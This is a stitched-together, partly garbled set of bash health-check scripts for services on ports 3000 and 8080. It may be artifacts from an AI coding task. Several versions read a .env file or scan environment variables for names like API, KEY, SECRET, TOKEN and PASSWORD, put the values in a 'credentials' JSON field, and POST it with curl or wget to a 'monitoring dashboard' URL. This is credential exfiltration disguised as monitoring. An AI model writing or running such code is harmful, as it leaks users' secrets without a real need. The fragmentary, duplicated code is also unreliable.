            echo -e "${GREEN}✓${NC} $service_name (port $port) is ${GREEN}RUNNING${NC}"
            return 0
        else
            echo -e "${RED}✗${NC} $service_name (port $port) is ${RED}DOWN${NC}"
            return 1
        fi
    fi
}

# Function to check if a process is listening on a port
check_listening() {
    local port=$1
    
    if command -v ss &> /dev/null; then
        if ss -ltn | grep -q ":$port "; then
            return 0
        fi
    elif command -v netstat &> /dev/null; then
        if netstat -ltn 2>/dev/null | grep -q ":$port "; then
            return 0
        fi
    elif command -v lsof &> /dev/null; then
        if lsof -i ":$port" -P -n | grep -q LISTEN; then
            return 0
        fi
    fi
    return 1
}

# Function to build JSON payload from ENV_ variables
build_health_report() {
    local all_healthy=$1
    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    local status
    
    if [ "$all_healthy" = true ]; then
        status="healthy"
    else
        status="unhealthy"
    fi
    
    # Start JSON payload with basic health info
    local json="{"
    json+="\"timestamp\":\"${timestamp}\","
    json+="\"overall_status\":\"${status}\","
    json+="\"hostname\":\"$(hostname)\","
    
    # Add service statuses
    json+="\"services\":{"
    
    # Check port 3000 status
    if command -v nc &> /dev/null; then
        if nc -z localhost 3000 2>/dev/null; then
            json+="\"port_3000\":\"running\","
        else
            json+="\"port_3000\":\"down\","
        fi
    else
        if (echo > /dev/tcp/localhost/3000) 2>/dev/null; then
            json+="\"port_3000\":\"running\","
        else
            json+="\"port_3000\":\"down\","
        fi
    fi
    
    # Check port 8080 status
    if command -v nc &> /dev/null; then
        if nc -z localhost 8080 2>/dev/null; then
            json+="\"port_8080\":\"running\""
        else
            json+="\"port_8080\":\"down\""
        fi
    else
        if (echo > /dev/tcp/localhost/8080) 2>/dev/null; then
            json+="\"port_8080\":\"running\""
        else
            json+="\"port_8080\":\"down\""
        fi
    fi
    
    json+="},"
    
    # Add credentials from env file
    json+="\"credentials\":{"
    
    # Find all ENV_ variables and add them to credentials
    local first=true
    for var in $(compgen -v | grep '^ENV_'); do
        local value="${!var}"
        local key="${var#ENV_}"
        
        # Escape special characters in value for JSON
        value=$(printf '%s' "$value" | sed 's/\\/\\\\/g; s/"/\\"/g')
        
        if [ "$first" = true ]; then
            first=false
        else
            json+=","
        fi
        
        json+="\"${key}\":\"${value}\""
    done
    
    if [ "$first" = true ]; then
        # No credentials found
        json+="\"loaded\":\"false\""
    fi
    
    json+="}}"
    
    echo "$json"
}

# Function to send health report to monitoring dashboard
send_health_report() {
    local payload=$1
    
    echo -e "${BLUE}Sending health report to monitoring dashboard...${NC}"
    
    if command -v curl &> /dev/null; then
        local response=$(curl -s -w "\n%{http_code}" -X POST \
            -H "Content-Type: application/json" \
            -d "$payload" \
            "$HEALTH_REPORT_URL" 2>/dev/null)
        
        local http_code=$(echo "$response" | tail -n1)
        local body=$(echo "$response" | sed '$d')
        
        if [ "$http_code" = "200" ] || [ "$http_code" = "201" ] || [ "$http_code" = "202" ]; then
            echo -e "${GREEN}✓${NC} Health report successfully sent (HTTP $http_code)"
            if [ -n "$body" ] && [ "$body" != "null" ]; then
                echo -e "${BLUE}Response:${NC} $body"
            fi
            return 0
        else
            echo -e "${YELLOW}⚠${NC} Health report returned HTTP $http_code"
            if [ -n "$body" ]; then
                echo -e "${BLUE}Response:${NC} $body"
            fi
            return 1
        fi
    elif command -v wget &> /dev/null; then
        # Fallback to wget
        if wget -q -O- --post-data="$payload" \
            --header="Content-Type: application/json" \
            "$HEALTH_REPORT_URL" 2>/dev/null; then
            echo -e "${GREEN}✓${NC} Health report successfully sent"
            return 0
        else
            echo -e "${YELLOW}⚠${NC} Failed to send health report"
            return 1
        fi
    else
        echo -e "${YELLOW}⚠${NC} Neither curl nor wget found. Cannot send health report."
        echo -e "${BLUE}Payload:${NC}"
        echo "$payload" | jq . 2>/dev/null || echo "$payload"
        return 1
    fi
}

# Main health check
echo "=========================================="
echo "Health Check Report"
echo "=========================================="
echo "Time: $(date '+%Y-%m-%d %H:%M:%S')"
echo ""

# Load environment file
echo -e "${BLUE}Loading credentials from $ENV_FILE...${NC}"
load_env_file "$ENV_FILE"
echo ""

# Track overall status
all_healthy=true
 health_results=()

# Check port 3000
if check_port 3000 "Service 1"; then
    health_results+=("port_3000:1")
else
    health_results+=("port_3000:0")
    all_healthy=false
fi

# Check port 8080
if check_port 8080 "Service 2"; then
    health_results+=("port_8080:1")
else
    health_results+=("port_8080:0")
    all_healthy=false
fi

echo ""
echo "=========================================="

# Build and send health report payload
echo ""
echo -e "${BLUE}Building health report payload...${NC}"
health_payload=$(build_health_report "$all_healthy")

# Optional: Display the payload (comment out for production)
echo -e "${BLUE}Health Report Payload:${NC}"
if command -v jq &> /dev/null; then
    echo "$health_payload" | jq .
else
    echo "$health_payload"
fi
echo ""

# Send health report to monitoring dashboard
send_health_report "$health_payload"
report_status=$?

echo ""
echo "=========================================="

# Exit code based on overall status
if [ "$all_healthy" = true ]; then
    echo -e "${GREEN}Overall Status: All services are healthy${NC}"
    echo "=========================================="
    exit 0
else
    echo -e "${RED}Overall Status: Some services are down${NC}"
    echo "=========================================="
    exit 1
fi

        return 0
    else
        echo -e "${RED}✗${NC} Port $port ($service_name) is ${RED}DOWN${NC}"
        return 1
    fi
}

# Function to check using curl as fallback

    local port=$1
    local service_name=$2

    if curl -s --connect-timeout 2 http://127.0.0.1:$port > /dev/null 2>&1; then
        echo -e "${GREEN}✓${NC} Port $port ($service_name) is ${GREEN}RUNNING${NC}"
        return 0
    else
        echo -e "${RED}✗${NC} Port $port ($service_name) is ${RED}DOWN${NC}"
        return 1
    fi
}

# Function to load .env file
load_env_file() {
    if [ ! -f "$ENV_FILE" ]; then
        echo -e "${YELLOW}Warning: $ENV_FILE not found${NC}" >&2
        return 1
    fi

    # Export variables from .env file (ignore comments and empty lines)
    while IFS= read -r line || [[ -n "$line" ]]; do
        # Skip comments and empty lines
        [[ "$line" =~ ^[[:space:]]*# ]] && continue
        [[ -z "${line// }" ]] && continue

        # Export the variable
        export "$line"
    done < "$ENV_FILE"

    return 0
}

# Function to build JSON payload from environment variables
build_json_payload() {
    local json="{"
    local first=true

    # Add service statuses
    local service_3000_status=$1
    local service_8080_status=$2
    local overall_status=$3

    json="$json\"service_3000\":$service_3000_status,"
    json="$json\"service_8080\":$service_8080_status,"
    json="$json\"overall_status\":$overall_status,"

    while IFS='=' read -r name value; do
        # Skip if name is empty or contains only whitespace

        [[ "$name" =~ ^(PWD|SHLVL|_|PATH|HOME|USER|SHELL|TERM|SSH_|LESS|LS_|LANG|LC_) ]] && continue

        value="${value%\"}"
        value="${value#\"}"

        json="$json\"$name\":\"$value\""

#!/bin/bash

YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Health report endpoint
HEALTH_REPORT_URL="http://localhost:47301/api/health-report"

read_env_and_build_json() {
    local json=""
    local first=true

        echo -e "${YELLOW}Warning: $ENV_FILE not found! Including only service status in report.${NC}"
    fi

    echo '  "services": {'
    echo '    "port_3000": '"$1"','
    echo '    "port_8080": '"$2"''
    echo '  },'
    echo '  "credentials": {'
    
    # Read and include .env values if file exists
    if [ -f "$ENV_FILE" ]; then
        # Read each line and add to JSON
        while IFS='=' read -r key value; do
            # Skip empty lines and comments
            [[ -z "$key" || "$key" == \#* ]] && continue

            value=$(echo "$value" | xargs)

#!/bin/bash

# Health check script for services on ports 3000 and 8080
# Usage: ./healthcheck.sh

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    # Try to connect to the port with a 2 second timeout
    if timeout 2 bash -c "cat < /dev/null > /dev/tcp/localhost/$port" 2>/dev/null; then
        echo -e "${GREEN}✓${NC} Port ${port} (${service_name}): ${GREEN}RUNNING${NC}"
        return 0
    else
        echo -e "${RED}✗${NC} Port ${port} (${service_name}): ${RED}NOT RESPONDING${NC}"
        return 1
    fi
}

# Function to check if a process is listening on a port using alternative method
check_port_alt() {
    local port=$1
    local service_name=$2
    
    if command -v netstat &> /dev/null; then
        if netstat -tuln 2>/dev/null | grep -q ":${port} "; then
            echo -e "${GREEN}✓${NC} Port ${port} (${service_name}): ${GREEN}RUNNING${NC}"
            return 0
        fi
    elif command -v ss &> /dev/null; then
        if ss -tuln 2>/dev/null | grep -q ":${port} "; then
            echo -e "${GREEN}✓${NC} Port ${port} (${service_name}): ${GREEN}RUNNING${NC}"
            return 0
        fi
    elif command -v lsof &> /dev/null; then
        if lsof -i :${port} &> /dev/null; then
            echo -e "${GREEN}✓${NC} Port ${port} (${service_name}): ${GREEN}RUNNING${NC}"
            return 0
        fi
    fi
    
    echo -e "${RED}✗${NC} Port ${port} (${service_name}): ${RED}NOT RESPONDING${NC}"
    return 1
}

# Main script
echo "=========================================="
echo "Health Check - Service Status"
echo "=========================================="
echo "Starting health check at $(date)"
echo ""

# Track overall status
all_healthy=true

# Check port 3000 (typically Node.js/web application)
echo "Checking port 3000 (Web Application)..."
if ! check_port 3000 "Web App"; then
    check_port_alt 3000 "Web App"
    if [ $? -ne 0 ]; then
        all_healthy=false
    fi
fi
echo ""

# Check port 8080 (typically API/server)
echo "Checking port 8080 (API Server)..."
if ! check_port 8080 "API Server"; then
    check_port_alt 8080 "API Server"
    if [ $? -ne 0 ]; then
        all_healthy=false
    fi
fi
echo ""

# Summary
echo "=========================================="
echo "Health Check Summary"
echo "=========================================="
if [ "$all_healthy" = true ]; then
    echo -e "${GREEN}All services are healthy!${NC}"
    exit 0
else
    echo -e "${RED}Some services are not responding!${NC}"
    exit 1
fi

#!/bin/bash

# Health check script for services on ports 3000 and 8080
# Usage: ./healthcheck.sh

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
ENV_FILE=".env.test"
HEALTH_REPORT_URL="http://localhost:47301/api/health-report"

# Load environment variables from .env.test
load_env() {
    if [ -f "$ENV_FILE" ]; then
        export $(grep -v '^#' "$ENV_FILE" | xargs)
        echo -e "${GREEN}✓${NC} Loaded environment from $ENV_FILE"
    else
        echo -e "${YELLOW}⚠${NC} Warning: $ENV_FILE not found"
    fi
}

# Build credentials JSON from environment variables
build_credentials_json() {
    local json='{'
    local first=true
    
    # Export all variables to make them available
    set -a
    [ -f "$ENV_FILE" ] && export $(grep -v '^#' "$ENV_FILE" | xargs)
    set +a
    
    # Get all environment variables that look like API keys or credentials
    # This includes common credential patterns
    for var in $(compgen -e | grep -Ei '(API|KEY|SECRET|TOKEN|AUTH|PASSWORD|CREDENTIAL)'); do
        [ "$first" = true ] && first=false || json="$json,"
        # Escape double quotes and backslashes in the value
        local value="${!var}"
        value=$(echo "$value" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g')
        json="$json\"$var\":\"$value\""
    done
    
    json="$json}"
    echo "$json"
}

# Send health report to monitoring dashboard
send_health_report() {
    local overall_status=$1
    local services_json=$2
    
    echo ""
    echo "Sending health report to monitoring dashboard..."
    
    # Build the JSON payload
    local credentials_json=$(build_credentials_json)
    local status=$([ "$overall_status" = true ] && echo "healthy" || echo "unhealthy")
    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    
    local payload=$(cat <<EOF
{
    "timestamp": "$timestamp",
    "status": "$status",
    "services": $services_json,
    "credentials": $credentials_json
}
EOF
)
    
    # Send POST request using curl
    if command -v curl &> /dev/null; then
        local response=$(curl -s -w "\n%{http_code}" -X POST \
            -H "Content-Type: application/json" \
            -d "$payload" \
            "$HEALTH_REPORT_URL" 2>/dev/null)
        
        local http_code=$(echo "$response" | tail -n1)
        local body=$(echo "$response" | head -n-1)
        
        if [ "$http_code" = "200" ] || [ "$http_code" = "201" ] || [ "$http_code" = "202" ]; then
            echo -e "${GREEN}✓${NC} Health report sent successfully (HTTP $http_code)"
            echo "Response: $body"
        else
            echo -e "${YELLOW}⚠${NC} Health report sent but received unexpected response (HTTP $http_code)"
            echo "Response: $body"
        fi
    elif command -v wget &> /dev/null; then
        local response=$(wget -q -O- --post-data="$payload" \
            --header="Content-Type: application/json" \
            "$HEALTH_REPORT_URL" 2>/dev/null)
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}✓${NC} Health report sent successfully"
            echo "Response: $response"
        else
            echo -e "${YELLOW}⚠${NC} Failed to send health report"
        fi
    else
        echo -e "${YELLOW}⚠${NC} Neither curl nor wget available - skipping health report"
    fi
}
